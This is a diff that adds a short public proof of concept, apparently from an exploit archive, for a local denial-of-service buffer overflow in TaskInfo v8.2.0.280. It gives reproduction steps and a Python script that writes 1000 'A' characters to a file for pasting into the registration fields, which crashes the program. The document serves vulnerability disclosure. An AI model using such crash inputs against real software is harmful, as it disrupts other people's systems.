@@ -1,0 +1,23 @@
+# Exploit Title: TaskInfo v8.2.0.280 - Denial of Service (PoC)
+# Discovery by: Rafael Pedrero
+# Discovery Date: 2019-01-30
+# Vendor Homepage: http://www.iarsn.com/
+# Software Link : http://www.iarsn.com/
+# Tested Version: v8.2.0.280
+# Tested on: Windows XP SP3
+# Vulnerability Type: Denial of Service (DoS) Local Buffer Overflow
+
+# Steps to Produce the Crash:
+# 1.- Run TaskInfo.exe
+# 2.- copy content TaskInfo_Crash.txt to clipboard (result from this python script)
+# 3.- Go to "Help" - "Registration" - "Set or View Registration Information" and paste the result in the "New User Name:" and "New Serial Number:" textbox.
+# 4.- Click in OK button and you will see a crash.
+
+
+#!/usr/bin/env python
+
+
+crash = "\x41" * 1000
+f = open ("TaskInfo_Crash.txt", "w")
+f.write(crash)
+f.close()
